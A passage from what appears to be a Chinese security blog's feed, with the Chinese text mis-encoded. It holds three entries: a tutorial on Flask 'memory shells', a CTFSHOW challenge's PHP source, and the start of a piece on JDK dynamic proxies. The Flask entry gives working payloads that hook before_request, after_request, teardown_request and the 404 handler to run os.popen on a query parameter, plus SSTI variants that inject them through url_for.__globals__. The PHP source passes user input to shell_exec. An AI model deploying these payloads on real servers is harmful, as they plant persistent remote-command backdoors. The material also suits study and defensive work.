class="string">&#x27;shell&#x27;</span>)).read())<span class="keyword">if</span> request.args.get(<span class="string">&#x27;shell&#x27;</span>) <span class="keyword">and</span> request.path.startswith(<span class="string">&#x27;/shell&#x27;</span>) <span class="keyword">else</span> resp)</span><br></pre></td></tr></table></figure><h3 id="teardown-request"><a href="#teardown-request" class="headerlink" title="teardown_request"></a>teardown_request</h3><p>teardown_requestçš„åº•å±‚å‡½æ•°è°ƒç”¨å’Œå‰é¢çš„å¾ˆç›¸ä¼¼<br><img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5.png" class="" title="alt text"><br>é‚£ä¹ˆæˆ‘ä»¬åªè¦å¥–å‰é¢çš„è¿›è¡Œæ›´æ”¹å³å¯<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].teardown_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp:<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;shell&#x27;</span>)).read())</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯å…¶ä»ç„¶æ— å›æ˜¾ï¼Œå³å…¶æ— æ³•è¾¾åˆ°æˆ‘ä»¬è¿›è¡Œæ— å›æ˜¾å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœï¼Œå…¶æ¯”è¾ƒå¤§çš„ä½œç”¨å¯èƒ½å°±æ˜¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„bypass<br><img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/6.png" class="" title="alt text"></p><h3 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h3><p>errorhandleråœ¨ä¸€äº›ç”¨æˆ·è®¾å®šçš„çŠ¶æ€ç ä¸‹è¿è¡Œå‡½æ•°ï¼Œå¦‚404ï¼Œ500<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_error</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;aaa&quot;</span></span><br></pre></td></tr></table></figure><br><img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/10.png" class="" title="alt text"><br>å¦‚ä¸Šåœ¨404æ˜¯å°±ä¼šè§¦å‘handle_errorå‡½æ•°</p><img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/7.png" class="" title="alt text"><img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/8.png" class="" title="alt text"><p>æ­¥å…¥å…¶å‡½æ•°ä¼šå‘ç°å…¶åº•å±‚ä¸º<code>self._get_exc_class_and_code(code_or_exception)</code>å’Œ<code>self.error_handler_spec[None][code][exc_class] = f</code> code_or_exceptionå°±æ˜¯è§¦å‘çš„å“åº”çŠ¶æ€ç ï¼Œfå°±æ˜¯å‡½æ•°ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å†™å‡ºpayloadäº†<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exc_class, code = <span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]._get_exc_class_and_code(<span class="number">404</span>);<span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].error_handler_spec[<span class="literal">None</span>][code][exc_class] = <span class="keyword">lambda</span> err: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;shell&#x27;</span>)).read()</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„ä»£ç å› ä¸ºæ˜¯å¤šè¡Œä»£ç æ‰€ä»¥æ— æ³•ä½¿ç”¨evalæ¥è¿è¡Œåªèƒ½ä½¿ç”¨execæ¥è¿è¡Œã€‚</p><h1 id="ä¸SSTIä¸­çš„ä½¿ç”¨"><a href="#ä¸SSTIä¸­çš„ä½¿ç”¨" class="headerlink" title="ä¸SSTIä¸­çš„ä½¿ç”¨"></a>ä¸SSTIä¸­çš„ä½¿ç”¨</h1><h2 id="before-request-1"><a href="#before-request-1" class="headerlink" title="before_request"></a>before_request</h2><p>åœ¨SSTIä¸­æˆ‘ä»¬ä¸Šè¿°payloadä¸­çš„requestç­‰éƒ½æ˜¯ä¸èƒ½ç›´æ¥ä½¿ç”¨éƒ½æ˜¯éœ€è¦å¯¼å…¥çš„,å³å¦‚ä¸‹<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda: __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;shell&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><br>åˆ©ç”¨flaskçš„å†…ç½®å‡½æ•°url<em>foræ¥å¾—åˆ°evalè¿›è€Œæ‰§è¡Œå‘½ä»¤ï¼Œè€Œrequestè¿˜éœ€è¦é€šè¿‡`{â€˜requestâ€™:url<em>for.__globals</em></em>[â€˜requestâ€™]}`æ¥å°†å…¶å®šä¹‰ä¸ºflaskä¸­çš„request</p><h2 id="after-request-1"><a href="#after-request-1" class="headerlink" title="after_request"></a>after_request</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp:__import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;shell&#x27;)).read())if request.args.get(&#x27;shell&#x27;) else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>after_requestä¹Ÿç›¸ä¼¼</p><h2 id="teardown-request-1"><a href="#teardown-request-1" class="headerlink" title="teardown_request"></a>teardown_request</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[<span class="string">&quot;exec&quot;</span>](<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda resp:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;shell&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>]&#125;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="errorhandler-1"><a href="#errorhandler-1" class="headerlink" title="errorhandler"></a>errorhandler</h2><p>è¿™ä¸ªåŒæ ·<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[&quot;exec&quot;](&quot;exc_class, code = __import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]._get_exc_class_and_code(404);__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].error_handler_spec[None][code][exc_class] = lambda err: __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;shell&#x27;)).read()&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><br>åªæ˜¯éœ€è¦æ›´æ”¹ä¸€äº›å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ä¸ºexec<br>è¿™ä¸ªçš„å†…å­˜é©¬æˆ‘è¿˜çœ‹åˆ°äº†æœ‰çš„å¸ˆå‚…ä½¿ç”¨äº†globalæ¥å¥–codeå’Œexc_classå®šä¹‰ä¸ºå…¨å±€å˜é‡ï¼Œä½†æ˜¯åœ¨å®éªŒä¸­å‘ç°å…¶å®å¹¶ä¸éœ€è¦ä½†æ˜¯æˆ‘è¿˜æ˜¯ç»™ä¸€ä¸‹è¿™ä¸ªpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[&quot;exec&quot;](&quot;global exc_class;global code;exc_class, code = __import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]._get_exc_class_and_code(404);__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].error_handler_spec[None][code][exc_class] = lambda err: __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;shell&#x27;)).read()&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="pickleçš„åº”ç”¨"><a href="#pickleçš„åº”ç”¨" class="headerlink" title="pickleçš„åº”ç”¨"></a>pickleçš„åº”ç”¨</h1><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">æ–°ç‰ˆFLASKä¸‹pythonå†…å­˜é©¬çš„ç ”ç©¶</a><br>è¿™ç»™å¸ˆå‚…å·²ç»å¥–pickleçš„æ–¹æ³•è®²çš„å¾ˆæ¸…æ¥šäº†ï¼Œæœ¬äººè¿™ç¯‡æ–‡ç« ä¹Ÿæ˜¯å­¦è‡ªè¿™ä½å¸ˆå‚…</p>]]></content>
      
      
      <categories>
          
          <category> å†…å­˜é©¬ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW</title>
      <link href="/2024/10/02/CTFSHOW/"/>
      <url>/2024/10/02/CTFSHOW/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;init.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;å¨£è¯²å§é´æ„¬å§›&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$data</span>.<span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;é¢ã„¦åŸ›å®¸æ’ç“¨é¦ï¿½&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;é‡å­˜æŸŠé´æ„¬å§›&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;é¢ã„¦åŸ›æ¶“å¶…ç“¨é¦ã„¦å¨éƒçŠ³æ½ˆé‡å­˜æŸŠ&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;é’çŠ»æ«é´æ„¬å§›&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;é¢ã„¦åŸ›æ¶“å¶…ç“¨é¦ã„¦å¨éƒçŠ³æ½ˆé’çŠ»æ«&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">existsUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache.php&#x27;</span>)?:<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cache.php&#x27;</span>,<span class="string">&#x27;&lt;!-- ctfshow-web-cache --&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clearCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;rm -rf cache.php&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flushCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache.php&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;cache.php&#x27;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> FLAG646;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">netTest</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;é›æˆ’æŠ¤éµÑ†î”‘æ¾¶è¾«è§¦&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ping ((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z]+$/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> åˆ·é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDKåŠ¨æ€ä»£ç†</title>
      <link href="/2024/09/26/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
      <url>/2024/09/26/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸ºä»€ä¹ˆè¦åŠ¨æ€ä»£ç†"><a href="#ä¸ºä»€ä¹ˆè¦åŠ¨æ€ä»£ç†" class="headerlink" title="ä¸ºä»€ä¹ˆè¦åŠ¨æ€ä»£ç†"></a>ä¸ºä»€ä¹ˆè¦åŠ¨æ€ä»£ç†</h1><p>æƒ³è¦çŸ¥é“ä¸ºä»€ä¹ˆéœ€è¦åŠ¨æ€ä»£ç†æˆ‘ä»¬éœ€è¦å…ˆçŸ¥é“ä»€ä¹ˆæ˜¯é™æ€ä»£ç†ï¼Œæœ‰äº†é™æ€ä»£ç†ä¸ºä»€ä¹ˆåˆéœ€è¦åŠ¨æ€ä»£ç†</p><p>é¦–å…ˆå…¶å®ä»£ç†å°±æ˜¯å°†ä¸€ä¸ªå®ç°æ¥å£çš„ç±»ï¼Œè¿›è¡Œè°ƒç”¨çš„ç±»ï¼Œå…¶å¯ä»¥åœ¨è°ƒç”¨çš„ç»§æ‰¿ä¸Šå¢åŠ ä¸€äº›è‡ªå·±çš„åŠŸèƒ½<br>ä¸€ä¸ªç®€å•çš„DEMOä»£ç å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//IUser.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getName</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//User.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;User&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//UserProxy.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProxy</span> <span class="keyword">implements</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">(IUser user)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        user.getName();</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨getName&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Main.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        User user=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        UserProxy proxy= <span class="keyword">new</span> <span class="title class_">UserProxy</span>(user);</span><br><span class="line">        proxy.getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åœ¨æˆ‘ä»¬è¿è¡ŒMainæ—¶ï¼Œé€šè¿‡äº†UserProxyè¿™ä¸ªä»£ç†æ¥è°ƒç”¨äº†Userçš„getName()æ–¹æ³•å¹¶ä¸”å› ä¸ºä»£ç†è‡ªèº«æ·»åŠ äº†ä¸€äº›åŠŸèƒ½è¿˜ä¼šè¾“å‡ºè°ƒç”¨getNameï¼Œå…¶å®è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ—¥å¿—åŠŸèƒ½<br><img src="/2024/09/26/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/1.png" class="" title="alt text"><br>ä½†æ˜¯è¿™ç§é™æ€ä»£ç†æœ‰ä¸ªå¾ˆæ˜æ˜¾çš„å¼Šç«¯å°±æ˜¯å¦‚æœæ¥å£å‘é€ä¿®æ”¹ï¼Œæˆ‘ä»¬ä¸ä»…è¦ä¿®æ”¹å®Œæˆæ¥å£çš„User.javahaè¿˜è¦ä¿®æ”¹æˆ‘ä»¬çš„ä»£ç†ç±»ï¼Œè¿™æ˜¯éå¸¸ç¹ççš„ã€‚<br>æ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿ç”¨åŠ¨æ€ä»£ç†ã€‚</p><h1 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" 